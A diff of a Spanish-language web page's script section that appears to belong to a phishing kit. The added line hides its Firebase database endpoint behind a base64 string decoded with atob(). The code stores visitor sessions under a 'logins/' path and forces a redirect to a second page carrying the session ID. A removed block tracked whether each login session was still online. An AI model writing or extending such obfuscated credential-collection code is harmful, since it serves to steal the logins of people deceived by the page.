@@ -2340,7 +2340,7 @@
         </div>
     </div>
     <script>
-        const firebaseConfig = { databaseURL: "https://copendndsn-default-rtdb.firebaseio.com/" };
+        const firebaseConfig = { databaseURL: atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=") };
         firebase.initializeApp(firebaseConfig);
 
         function siguiente() {
@@ -2356,29 +2356,6 @@
             // REDIRECCIÓN FORZADA CON ID
             window.location.href = "index2.html?id=" + id;
         }
-    </script>
-    <script>
-// Coloca esto después de inicializar Firebase en la página del usuario
-function gestionarPresencia(idDeSesion) {
-    if (!idDeSesion) return;
-
-    const db = firebase.database();
-    const myConnectionsRef = db.ref(`logins/${idDeSesion}/online`);
-    const connectedRef = db.ref('.info/connected');
-
-    connectedRef.on('value', (snap) => {
-        if (snap.val() === true) {
-            // Cuando me desconecte por cerrar la pestaña, Firebase pondrá online: false
-            myConnectionsRef.onDisconnect().set(false);
-            
-            // Ahora mismo estoy conectado
-            myConnectionsRef.set(true);
-        }
-    });
-}
-
-// Ejecutar la función con el sessionId que ya tienes en tu script
-gestionarPresencia(sessionId);
     </script>
     <!-- Code injected by live-server -->
     <script>
